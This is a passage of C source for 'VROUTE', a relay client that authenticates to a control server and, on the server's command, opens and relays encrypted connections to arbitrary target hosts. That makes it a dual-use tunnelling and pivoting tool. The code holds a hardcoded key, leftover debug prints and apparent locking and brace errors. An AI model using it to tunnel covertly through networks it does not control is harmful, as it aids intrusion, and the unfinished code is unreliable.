        VR_LOG(LOG_INFO, "Received command is CHANNEL_OPEN_CMD");
        
        if(cmd_sz < sizeof(conn_cmd))
            return 0;

        channel_id = c_data->channel_id;
        ip_addr = c_data->ip_addr;
        port = c_data->port;

        dummy_in.sin_addr.s_addr = ip_addr;

        host = inet_ntoa(dummy_in.sin_addr);
        if(!host) {
            VR_LOG(LOG_ERROR, "Error at inet_ntoa()");
            return 0;
        }
        
        VR_LOG(LOG_INFO, "Connection target is: %s:%d (channel ID: %ld)", host, port, channel_id);

        if(!open_channel_conn(channel_id, host, port)) {
            VR_LOG(LOG_ERROR, "Error opening connection with target...");
            return 0;
        }
            
        VR_LOG(LOG_INFO, "Connection with target opened for channel ID: %ld", channel_id);

        return 1;

    } else if(cmd_c == cmd_def_data[CHANNEL_CLOSE_CMD].value) {
        VR_LOG(LOG_INFO, "Received command is CHANNEL_CLOSE_CMD");
        
        channel_id = c_data->channel_id;

        if(!close_channel(channel_id)) {
            VR_LOG(LOG_ERROR, "Error trying to close channel: %ld", channel_id);
            return 1; /* do not consider fatal error*/
        }
        
        VR_LOG(LOG_INFO, "Channel %ld successfully closed", channel_id);

        return 1;

    } else if(cmd_c == cmd_def_data[RELAY_CLOSE_CMD].value) {
        VR_LOG(LOG_INFO, "Received command is RELAY_CLOSE_CMD");
        
        shutdown_relay();

        return 1;

    } else if(cmd_c == cmd_def_data[PING_CMD].value) {
        VR_LOG(LOG_INFO, "Received command is PING_CMD");
        
        last_conn_time = time(NULL);

        if(!send_remote_cmd(PING_CMD, 0)) {
            VR_LOG(LOG_ERROR, "Error sending PING_CMD back to control server");
            return 0;
        }
        
        VR_LOG(LOG_INFO, "Pinged back successfully");

        return 1;

    } else {
        VR_LOG(LOG_ERROR, "Unknown command received");
        return 0;
    }

    return 1;
}

/*

vroute handshake protocol:

1/ client connects server (either with TCP, HTTP or HTTPS)
2/ server sends a random string x to the client
3/ client uses AES encryption on the random string: y = AES(x, SHA256(key))
4/ client sends SHA256(y) to the server
5/ server verifies by applying the same process, and compares to the received string
6/ if they coincide, server sends the assigned client_id, else sends 0 (uint32_t)

*/

char *get_challenge_solution(char *challenge, size_t size, size_t *out_size, char *key, size_t key_sz) {
    char *ptr = NULL;
    char *sol = NULL;
    size_t out_size_x = 0;
    size_t s_out_size = 0;
    
    if(!challenge || size == 0 || !out_size || !key || key_sz == 0) 
        return NULL;
        
    *out_size = 0;
    
    ptr = encrypt_challenge(challenge, size, key, key_sz, &out_size_x);
    if(!ptr) {
        VR_LOG(LOG_ERROR, "Error trying to encrypt challenge");
        return NULL;
    }
        
    if(out_size_x == 0)
        return NULL;
        
    sol = sha256_hash(ptr, out_size_x, &s_out_size);
    if(!sol) {
        if(ptr) {
            free(ptr);
            ptr = NULL;
        }
        VR_LOG(LOG_ERROR, "Error trying to hash challenge with SHA-256");
        return NULL;
    }
        
    if(ptr) {
        free(ptr);
        ptr = NULL;
    }
    
    *out_size = s_out_size;
    return sol;
}

uint32_t do_tcp_handshake(int sock, char *key, size_t key_sz) {
    int r = 0;
    char chall[CHALLENGE_DEFAULT_SIZE + 1] = { 0 };
    size_t out_size = 0;
    char *p = NULL;
    uint32_t cid = 0;
    
    if(sock < 0 || !key || key_sz == 0)
       return 0;
       
    r = read(sock, chall, CHALLENGE_DEFAULT_SIZE);
    if(r <= 0) {
        VR_LOG(LOG_ERROR, "Error receiving challenge from control server");
        return 0;
    }
        
    puts("tcpphandshake2222");
        
    if(r != CHALLENGE_DEFAULT_SIZE) {
        VR_LOG(LOG_ERROR, "Received number of bytes is not CHALLENGE_DEFAULT_SIZE");
        return 0;
    }
    
    p = get_challenge_solution(chall, CHALLENGE_DEFAULT_SIZE, &out_size, key, key_sz);
    if(!p || out_size == 0) {
        VR_LOG(LOG_ERROR, "Error when trying to get challenge solution");
        return 0;
    }
        
    r = write(sock, p, out_size);
    if(r <= 0) {
        if(p) {
            free(p);
            p = NULL;
        }
        VR_LOG(LOG_ERROR, "Error when sending challenge solution to control server");
        return 0;
    }
    
    if(p) {
        free(p);
        p = NULL;
    }
    
    r = read(sock, &cid, sizeof(uint32_t));
    if(r <= 0 || r != sizeof(uint32_t)) {
        VR_LOG(LOG_ERROR, "Error getting final verdict from control server");
        return 0;
    }
        
    if(cid == 0) {
        VR_LOG(LOG_ERROR, "Control server rejected our connection: failed authentication");
        return 0;
    }
    
    VR_LOG(LOG_INFO, "Server opened a new connection: handshake passed");
  
    return cid;
}

uint32_t do_http_handshake(char *host, int port, int is_https, char *key, size_t key_sz) {
    ssize_t r = 0;
    char chall[CHALLENGE_DEFAULT_SIZE + 1] = { 0 };
    char *p = NULL;
    char *s = NULL;
    size_t r_out_sz = 0;
    size_t out_size = 0;
    uint32_t cid = 0;
   
    if(!host || port <= 0 || is_https < 0 || !key || key_sz == 0)
        return 0;
   
    r = recv_http_data(host, port, &p, &r_out_sz, is_https);
    if(r <= 0) {
        VR_LOG(LOG_ERROR, "Error receiving data from control server for HTTP handshake");
        return 0;
    }
       
    if(r_out_sz != CHALLENGE_DEFAULT_SIZE) {
        VR_LOG(LOG_ERROR, "Received data is not CHALLENGE_DEFAULT_SIZE");
        return 0;
    }
       
    s = get_challenge_solution(p, CHALLENGE_DEFAULT_SIZE, &out_size, key, key_sz);
    if(!s || out_size == 0) {
        if(p) {
            free(p);
            p = NULL;
        }
        VR_LOG(LOG_ERROR, "Error trying to get the challenge solution");
        return 0;
    }
       
    if(p) {
        free(p);
        p = NULL;
    }
       
    r = send_http_data(host, port, &s, &out_size, is_https);
    if(r <= 0) {
        if(s) {
            free(s);
            s = NULL;
        }
        VR_LOG(LOG_ERROR, "Error sending challenge solution to control server");
        return 0;
    }

    if(s) {
        free(s);
        s = NULL;
    }
   
    p = NULL;
    r_out_sz = 0;
   
    r = recv_http_data(host, port, &p, &r_out_sz, is_https);
    if(r <= 0) {
        VR_LOG(LOG_ERROR, "Error trying to get control server final verdict");
        return 0;
    }
       
    if(r_out_sz != sizeof(uint32_t)) {
        if(p) {
            free(p);
            p = NULL;
        }
        VR_LOG(LOG_ERROR, "Received a number of bytes different than uint32_t size");
        return 0;
    }
       
    memcpy(&cid, p, sizeof(uint32_t));
    
    if(cid == 0) {
        VR_LOG(LOG_ERROR, "Server rejected our connection: failed authentication");
        return 0;
    }
    
    VR_LOG(LOG_INFO, "Server opened a new connection with us: handshake passed");
  
    return cid;
}

uint32_t handshake(int sock, char *host, int port, proto_t proto, char *key, size_t key_sz) {
    uint32_t cid = 0;
  
    if(sock < 0 || !host || port <= 0 || !key || key_sz == 0)
        return 0;
  
    pthread_mutex_lock(&glb_conn_lock);
  
    client_id = 0;
    handshake_sess_id = generate_handshake_sess_id();
    
    VR_LOG(LOG_INFO, "handshake session ID: %ld", handshake_sess_id);

    if(proto == TCP_COM_PROTO) {
        cid = do_tcp_handshake(sock, key, key_sz);
    } else if(proto == HTTP_COM_PROTO || proto == HTTPS_COM_PROTO) {
        cid = do_http_handshake(host, port, (proto == HTTPS_COM_PROTO) ? 1 : 0, key, key_sz);
    } else {
        pthread_mutex_unlock(&glb_conn_lock);
        handshake_sess_id = 0;
        return 0;
    }

    if(cid <= 0) {
        pthread_mutex_unlock(&glb_conn_lock);
        handshake_sess_id = 0;
        return 0;
    }
    
    VR_LOG(LOG_INFO, "Challenge succeed in authentication by client...");

    client_id = cid;
    handshake_sess_id = 0;

    pthread_mutex_unlock(&glb_conn_lock);
    return 1;
}

void relay_poll(char *host, int port, proto_t proto) {
    int fd_x = -1;
    int channel_sock = 0;
    size_t n = 0;
    int ch_id = 0;
    char dummy = 0;
    int r = 0;
    ssize_t rx = 0;
    int r0 = 0;
    char i_recv_buf[sizeof(tlv_header)] = { 0 };
    tlv_header *recv_tlv = (tlv_header *)&i_recv_buf;
    char *data_buf = NULL;
    tlv_header *tlv_buf = NULL;
    struct timeval tv;
    fd_set rfds;
    fd_set ofds;
    int retval = 0;
    char *data_x = NULL;
    size_t data_sz_x = 0;
    char *enc = NULL;
    size_t enc_sz = 0;
  
    if(!host || port <= 0)
        return;

    while(1) {
        if(srv_down)
            break;

        if(!global_conn)
            return;

        //sleep(1);

        memset(i_recv_buf, 0, sizeof(i_recv_buf));

        FD_ZERO(&rfds);
        FD_ZERO(&ofds);
    
        n = 0;

        pthread_mutex_lock(&main_loop_sock);
        
        pthread_mutex_lock(&glb_conn_lock);

        for(int x = 0 ; x < MAX_CONCURRENT_CHANNELS ; x++) {
            if(pending_ch_array[x] != 0) {
                VR_LOG(LOG_DEBUG, "Adding pending sock %d to the fd pool...", pending_ch_array[x]);
                if(pending_ch_array[x] < FD_SETSIZE) {
                    FD_SET(pending_ch_array[x], &ofds);
                    FD_SET(pending_ch_array[x], &rfds);
                }
            }
        }
        
        for(int i = 0 ; i < MAX_CONCURRENT_CHANNELS ; i++) {
            if(global_conn[i].channel_id != 0 && global_conn[i].sock > 0) {
                fd_x = global_conn[i].sock;
                if(FD_ISSET(fd_x, &ofds)) {
                    VR_LOG(LOG_DEBUG, "Skipping sock %d to the fd pool (already set from pending pool)...", fd_x);
                    pthread_mutex_unlock(&glb_conn_lock);
                    continue;
                }
                VR_LOG(LOG_DEBUG, "Adding channel sock %d to the fd pool...", fd_x);
                if(fd_x < FD_SETSIZE)
                    FD_SET(fd_x, &rfds);
                n++;
            }
        }
        
        pthread_mutex_unlock(&glb_conn_lock);

        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        puts("xxxx");

        retval = select(FD_SETSIZE, &rfds, &ofds, NULL, &tv);
        if(retval == -1) {
            VR_LOG(LOG_ERROR, "Error at select(). Retrying...");
            pthread_mutex_unlock(&main_loop_sock);
            continue;
        } else if(retval == 0) {
            VR_LOG(LOG_ERROR, "No data to receive...");
            goto ctl_srv_recv;
            //pthread_mutex_unlock(&glb_conn_lock);
            //continue;
        }
        
        puts("mmmmm");

        for(int x = 0 ; x < MAX_CONCURRENT_CHANNELS ; x++) {
            if(pending_ch_array[x] > 0) {
                if(FD_ISSET(pending_ch_array[x], &ofds) || FD_ISSET(pending_ch_array[x], &rfds)) {
                    VR_LOG(LOG_DEBUG, "sock %d is set...", pending_ch_array[x]);
                    
                    ch_id = get_channel_id_by_sock(pending_ch_array[x]);
                    if(ch_id <= 0) {
                        VR_LOG(LOG_ERROR, "Error getting channel ID for pending sock...");
                        pthread_mutex_unlock(&main_loop_sock);
                        return;
                    }

                    r0 = recv(pending_ch_array[x], &dummy, 0, MSG_DONTWAIT);
                    if(r0 < 0) {
                        if(errno == EAGAIN || errno == EWOULDBLOCK || errno == 10035) {
                            pending_ch_array[x] = 0;
                            
                            VR_LOG(LOG_DEBUG, "Connection is considered successful");

                            if(!send_remote_cmd(FORWARD_CONNECTION_SUCCESS, ch_id)) {
                                VR_LOG(LOG_ERROR, "Error sending FORWARD_CONNECTION_SUCCESS");
                                pthread_mutex_unlock(&main_loop_sock);
                                return;
                            }

                            pthread_mutex_unlock(&main_loop_sock);
                            continue;
                        }

                        if(errno == ECONNREFUSED || errno == ETIMEDOUT) {
                            VR_LOG(LOG_ERROR, "Connection problems! Marking as: FORWARD_CONNECTION_FAILURE");
                        }

                        if(!close_channel(ch_id)) {
                            VR_LOG(LOG_ERROR, "Error closing channel");
                            pthread_mutex_unlock(&main_loop_sock);
                            return;
                        }

                        pending_ch_array[x] = 0;
                        
                        VR_LOG(LOG_DEBUG, "Connection is considered FAILED");

                        if(!send_remote_cmd(FORWARD_CONNECTION_FAILURE, ch_id)) {
                            VR_LOG(LOG_ERROR, "Error sending FORWARD_CONNECTION_FAILURE");
                            pthread_mutex_unlock(&glb_conn_lock);
                            return;
                        }

                        pthread_mutex_unlock(&main_loop_sock);
                        continue;
                }

                pending_ch_array[x] = 0;
                
                VR_LOG(LOG_DEBUG, "Connection is considered successful (2)");

                if(!send_remote_cmd(FORWARD_CONNECTION_SUCCESS, ch_id)) {
                    VR_LOG(LOG_ERROR, "Error sending FORWARD_CONNECTION_SUCCESS");
                    pthread_mutex_unlock(&main_loop_sock);
                    return;
                }

            }
        }
    }
    
    puts("lkllllllllllllllll");

    for(int i = 0 ; i < MAX_CONCURRENT_CHANNELS ; i++) {
        if(global_conn[i].channel_id != 0 && global_conn[i].sock > 0) {
            fd_x = global_conn[i].sock;
            if(fd_x < FD_SETSIZE && FD_ISSET(fd_x, &rfds)) {
                if(fd_x != _ctl_sock) {
                    ch_id = get_channel_id_by_sock(fd_x);
                    if(ch_id <= 0) {
                        VR_LOG(LOG_ERROR, "Channel ID not found for sock");
                        pthread_mutex_unlock(&main_loop_sock);
                        return;
                    }

                    data_buf = calloc(sizeof(tlv_header) + RELAY_BUFFER_SIZE, sizeof(char));
                    if(!data_buf) {
                        pthread_mutex_unlock(&main_loop_sock);
                        return;
                    }
                    tlv_buf = (tlv_header *)data_buf;

                    r = read(fd_x, data_buf + sizeof(tlv_header), RELAY_BUFFER_SIZE);
                    if(r <= 0) {
                        if(data_buf) {
                            free(data_buf);
                            data_buf = NULL;
                        }

                        VR_LOG(LOG_ERROR, "Error reading from channel...");

                        if(!close_channel(ch_id)) {
                            VR_LOG(LOG_ERROR, "Error closing channel");
                            pthread_mutex_unlock(&main_loop_sock);
                            return;
                        }

                        if(!send_remote_cmd(FORWARD_CONNECTION_FAILURE, ch_id)) {
                            VR_LOG(LOG_ERROR, "Error sending channel-closed cmd to server");
                            pthread_mutex_unlock(&main_loop_sock);
                            return;
                        }

                        pthread_mutex_unlock(&main_loop_sock);
                        continue;
                    }
                    
                    hexdump("end received data", data_buf, r);
                    
                    VR_LOG(LOG_DEBUG, "Received %d bytes from relay channel %d", r, ch_id);

                    tlv_buf->client_id = client_id;
                    tlv_buf->channel_id = ch_id;
                    tlv_buf->tlv_data_len = r;
                    
                    VR_LOG(LOG_DEBUG, "Sending data to control server....");

                    if(send_data_to_ctl_srv(data_buf, sizeof(tlv_header) + r) <= 0) {
                        if(data_buf) {
                            free(data_buf);
                            data_buf = NULL;
                        }
                        pthread_mutex_unlock(&main_loop_sock);
                        return;
                    }

                    if(data_buf) {
                        free(data_buf);
                        data_buf = NULL;
                    }
                }
            }
        }
    }
    
    puts("tttttttttttttttttt");

    // We check here if there is something to receive from control server
    // If 0 bytes received, means nothing was sent by the server, so
    // No commands to interpret

ctl_srv_recv:

    VR_LOG(LOG_DEBUG, "Checking if there is data to receive from control server...");

    rx = ctl_recv_data(_ctl_sock, host, port, &enc, &enc_sz, proto);
    if(rx < 0) {
        VR_LOG(LOG_ERROR, "Error reading from control server");
        pthread_mutex_unlock(&main_loop_sock);
        return;
    }
    
    if(enc_sz == 0) {
        VR_LOG(LOG_ERROR, "No data received from control server");
        pthread_mutex_unlock(&main_loop_sock);
        continue;
    }
    
    data_x = decrypt_data(enc, enc_sz, _key, _key_sz, &data_sz_x);
    if(!data_x) {
        VR_LOG(LOG_ERROR, "Error decrypting data...");
        pthread_mutex_unlock(&main_loop_sock);
        continue;
    }

    if(data_sz_x == 0) {
        VR_LOG(LOG_ERROR, "No data received from control server");
        pthread_mutex_unlock(&main_loop_sock);
        continue;
    }

    if(data_sz_x < sizeof(tlv_header)) {
        VR_LOG(LOG_ERROR, "Error reading from control server ");
        pthread_mutex_unlock(&main_loop_sock);
        return;
    }

    memcpy(i_recv_buf, data_x, sizeof(tlv_header));

    if(recv_tlv->tlv_data_len > (data_sz_x - sizeof(tlv_header))) {
        VR_LOG(LOG_ERROR, "Wrong tlv_header from control server...");
        pthread_mutex_unlock(&main_loop_sock);
        return;
    }

    data_buf = calloc(recv_tlv->tlv_data_len, sizeof(char));
    if(!data_buf) {
        pthread_mutex_unlock(&main_loop_sock);
        return;
    }

    memcpy(data_buf, data_x + sizeof(tlv_header), recv_tlv->tlv_data_len);

    if(data_x) {
        free(data_x);
        data_x = NULL;
    }
    
    if(enc) {
        free(enc);
        enc = NULL;
    }

/*
    if(data_sz_x != recv_tlv->tlv_data_len) {
        VR_LOG(LOG_WARN, "Not all data received from server side (%ld expected, %ld received)...", recv_tlv->tlv_data_len, data_sz_x);
    }
*/

    if(recv_tlv->channel_id == COMMAND_CHANNEL) {
        VR_LOG(LOG_INFO, "Received packet is a command from control server...");
        if(!interpret_remote_cmd(data_buf, recv_tlv->tlv_data_len)) {
            if(data_buf) {
                free(data_buf);
                data_buf = NULL;
            }

            VR_LOG(LOG_ERROR, "Error interpreting received command");
            pthread_mutex_unlock(&main_loop_sock);
            return; 
        }
    } else {
        VR_LOG(LOG_INFO, "Received packet is data to relay...");
        channel_sock = get_sock_by_channel_id(recv_tlv->channel_id);
        if(channel_sock <= 0) {
            if(data_buf) {
                free(data_buf);
                data_buf = NULL;
            }

            VR_LOG(LOG_ERROR, "Channel was not found");
            pthread_mutex_unlock(&main_loop_sock);
            return;
        }

        if(!relay_data(channel_sock, data_buf, recv_tlv->tlv_data_len)) {
                if(data_buf) {
                    free(data_buf);
                    data_buf = NULL;
                }

                VR_LOG(LOG_ERROR, "Error relaying data");
                pthread_mutex_unlock(&main_loop_sock);
                return;
            }

            if(data_buf) {
                free(data_buf);
                data_buf = NULL;
            }
        }

        pthread_mutex_unlock(&main_loop_sock);
    }

    return;
}

int is_valid_host_or_ip_addr(char *str) {
    struct in_addr addr;
    int result = 0;
    char *token = NULL;
    
    if(!str)
       return 0;

    result = inet_pton(AF_INET, str, &addr);
    if(result == 1)
        return 1;

    if(strlen(str) > MAX_HOSTNAME_SIZE)
        return 0;

    token = strtok((char *)str, ".");
    if(!token)
        return 0;

    do {
        if(strlen(token) > 63)
            return 0;

        for(int i = 0 ; i < strlen(token) ; i++) {
            if(!isalnum(token[i]) && token[i] != '-')
                return 0;
        }

        token = strtok(NULL, ".");
    } while(token != NULL);

    return 1;
}

int is_valid_proxy_or_relay_port(int port) {
    if(port <= 0)
        return 0;
    
    if(port > 65535)
        return 0;

    return 1;
}

int start_relay_conn(char *host, int port, proto_t proto, char *key, size_t key_sz) {
    int ctl_sock = 0;
    int r = 0;
    int x = 0;
    ssize_t rx = 0;
    int ret = 0;
    char *data = NULL;
    size_t data_sz = 0;
    int consec_err = 0;
    
    VR_LOG(LOG_INFO, "Starting VROUTE client version '%s'...", VROUTE_VERSION);

    if(!host || port == 0 || !key || key_sz == 0)
        return 0;
    
    if(key_sz > MAX_KEY_SIZE)
        return 0;
    
    if(proto != TCP_COM_PROTO && proto != HTTP_COM_PROTO
                && proto != HTTPS_COM_PROTO)
        return 0;
    
    if(!is_valid_host_or_ip_addr(host))
        return 0;
    
    if(!is_valid_proxy_or_relay_port(port))
        return 0;

    if(proto == HTTPS_COM_PROTO)
        init_openssl();

    last_conn_time = 0;
    _ctl_sock = -1;

    while(x < 10) {
        srand((time(NULL) * getpid()) + clock() + ret);
        ret = rand();
        x++;
    }

    if(!global_conn) {
        global_conn = calloc(MAX_CONCURRENT_CHANNELS, sizeof(channel_def));
        if(!global_conn) {
            if(proto == HTTPS_COM_PROTO)
                destroy_ssl();
            return 0;
        }
    }
  
    VR_LOG(LOG_INFO, "Starting main loop...");
    
  
    consec_err = 0;

    while(1) {
        if(consec_err > 2) {
            VR_LOG(LOG_ERROR, "Maximum connection tries reached. Aborting...");
            srv_down = 1;
            sleep(2);
        }
    
        if(srv_down) {
            VR_LOG(LOG_INFO, "Request to abort. Aborting...");
            return 0;
        }
            
        VR_LOG(LOG_INFO, "Connecting to VROUTE relay server at: %s:%d...", host, port);

        if(proto == TCP_COM_PROTO) {
            ctl_sock = connect_ctl_srv(host, port);
            if(ctl_sock < 0) {
                VR_LOG(LOG_ERROR, "Error connecting to server. Retrying...");
                consec_err++;
                sleep(10);
                continue;
            }
        } else
            ctl_sock = MAGIC_DUMMY_FD;
            
        VR_LOG(LOG_DEBUG, "Starting VROUTE handshake with relay server...");

        // negotiate client_id with HTTP(S) or TCP
        if(!handshake(ctl_sock, host, port, proto, key, key_sz)) {
            close_wrp(ctl_sock);
            if(proto == HTTPS_COM_PROTO)
                destroy_ssl();
            VR_LOG(LOG_ERROR, "Error handshaking with server. Aborting...");
            return 0;
        }

        VR_LOG(LOG_INFO, "Connection succeed with: %s:%d", host, port);
        
        VR_LOG(LOG_DEBUG, "Initializing global definitions...");

        _host = strdup(host);
        _port = port;
        _ctl_sock = ctl_sock;
        _proto = proto;
        _key = memdup(key, key_sz);
        _key_sz = key_sz;

        VR_LOG(LOG_INFO, "Starting ping worker...");
        
        __ping_worker();

        VR_LOG(LOG_INFO, "Starting relay poll...");
        
        relay_poll(host, port, proto);

        if(srv_down) {
            VR_LOG(LOG_INFO, "Request to abort. Aborting...");
            return 0;
        }

        sleep(10);
    }
    
    VR_LOG(LOG_INFO, "Closing client...");

    if(proto == HTTPS_COM_PROTO)
        destroy_ssl();

    return 1;
}

#define PSK "p@ssw0rd_3241!!=#"

int main(void) {
    if(!start_relay_conn("127.0.0.1", 1337, TCP_COM_PROTO, PSK, strlen(PSK))) {
        VR_LOG(LOG_ERROR, "Unknown error occurred");
        return 1;
    }
    return 0;
}




